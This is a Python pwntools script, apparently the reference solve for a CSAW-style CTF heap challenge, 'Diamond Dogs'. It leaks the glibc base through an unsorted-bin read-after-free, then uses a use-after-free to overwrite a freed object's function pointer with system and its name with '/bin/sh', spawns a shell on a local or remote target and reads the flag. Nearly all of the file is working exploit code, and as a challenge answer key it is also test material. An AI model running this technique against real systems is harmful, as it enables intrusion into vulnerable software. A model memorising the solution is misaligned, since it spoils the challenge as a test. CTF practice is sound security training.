#!/usr/bin/env python3
"""
Diamond Dogs - reference exploit.

Intended path (glibc 2.31):
  1. File a >0x410 note and a guard, shred the big one so it lands in the
     unsorted bin; read-after-free on it leaks main_arena -> libc base.
  2. Adopt a dog (object = { char name[0x18]; void(*bark)(dog*); }, one 0x30
     chunk) and release it -> tcache[0x30]. File a same-size note to reclaim
     that chunk with attacker bytes: name = "/bin/sh", bark = system.
  3. `command` the (freed, reclaimed) dog: it calls bark(dog) == system(dog),
     and dog points at "/bin/sh". Shell.

Why this resists automation: it is a use-after-free whose exploitation is a
stateful groom -- recognise the dangling object, understand the struct
layout (name-before-handler is what makes system's argument land on
"/bin/sh"), obtain a libc leak first, and sequence release -> reclaim ->
command exactly. Wrong ordering corrupts the heap silently.

Local:   python3 solve.py
Remote:  REMOTE=host:port python3 solve.py
"""
import os
from pwn import *

context.arch = "amd64"
context.log_level = os.environ.get("LOGLEVEL", "info")

HERE = os.path.dirname(os.path.abspath(__file__))
FILES = os.path.abspath(os.path.join(HERE, "..", "files"))
BIN = os.path.join(FILES, "guard-dog")
libc = ELF(os.path.join(FILES, "libc-2.31.so"), checksec=False)


def start():
    r = os.environ.get("REMOTE")
    if r:
        host, port = r.split(":")
        return remote(host, int(port))
    return process(BIN, cwd=FILES)


io = start()


def adopt(idx, name):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"(0-7): ", str(idx).encode())
    io.sendafter(b"name: ", name.ljust(0x18, b"\x00"))   # read_n reads exactly NAMELEN


def command(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"kennel: ", str(idx).encode())


def release(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"kennel: ", str(idx).encode())


def add_note(idx, size, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"(0-7): ", str(idx).encode())
    io.sendlineafter(b"size: ", str(size).encode())
    io.sendafter(b"contents: ", data.ljust(size, b"\x00"))


def show_note(idx):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"note slot: ", str(idx).encode())
    io.recvuntil(b"contents: ")
    return io.recv(8)


def free_note(idx):
    io.sendlineafter(b"> ", b"6")
    io.sendlineafter(b"note slot: ", str(idx).encode())


# --- 1. libc leak via unsorted bin -----------------------------------------
add_note(0, 0x500, b"beacon")     # > 0x410 -> unsorted on free
add_note(1, 0x28, b"guard")       # block consolidation with top
free_note(0)
leak = u64(show_note(0))
libc.address = leak - (libc.sym["__malloc_hook"] + 0x70)   # main_arena+0x60
log.info("libc leak    : %#x", leak)
log.success("libc base    : %#x", libc.address)
assert libc.address & 0xfff == 0, "bad libc base -- offset wrong?"
system = libc.sym["system"]
log.info("system       : %#x", system)

# --- 2. UAF: reclaim a released dog, hijack bark ---------------------------
adopt(0, b"rex")                  # dog object, one 0x30 chunk
release(0)                        # -> tcache[0x30], slot still dangling
payload = b"/bin/sh\x00".ljust(0x18, b"\x00") + p64(system)
add_note(2, 0x20, payload)        # reclaims the dog chunk; name="/bin/sh", bark=system

# --- 3. fire ----------------------------------------------------------------
command(0)                        # dog->bark(dog) == system("/bin/sh")

io.sendline(b"cat flag.txt")
io.recvuntil(b"csaw{")
flag = b"csaw{" + io.recvuntil(b"}")
log.success("FLAG: %s", flag.decode())
assert flag.startswith(b"csaw{") and flag.endswith(b"}")
print(flag.decode())
